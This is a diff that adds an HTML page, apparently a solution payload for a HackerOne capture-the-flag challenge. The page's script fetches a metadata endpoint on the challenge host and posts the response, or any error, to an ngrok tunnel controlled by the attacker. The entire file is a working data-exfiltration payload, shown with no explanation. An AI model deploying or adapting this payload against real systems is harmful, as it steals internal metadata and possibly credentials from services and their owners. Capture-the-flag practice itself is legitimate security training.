@@ -1,0 +1,17 @@
+<html>
+    <head>
+        <script>
+            fetch("//pizza.hacktivity.h1ctf.com/metadata")
+                .then(r => r.text())
+                .then(data => leak("info", data))
+                .catch(error => leak("error", JSON.stringify(error)));
+
+            function leak(tag, data) {
+                fetch("//24d4ecfb5adf.ngrok.io?tag=" + tag + "&cb=" + Date.now(), {method: "post", body: data})
+            }
+        </script>
+    </head>
+    <body>
+
+    </body>
+</html>
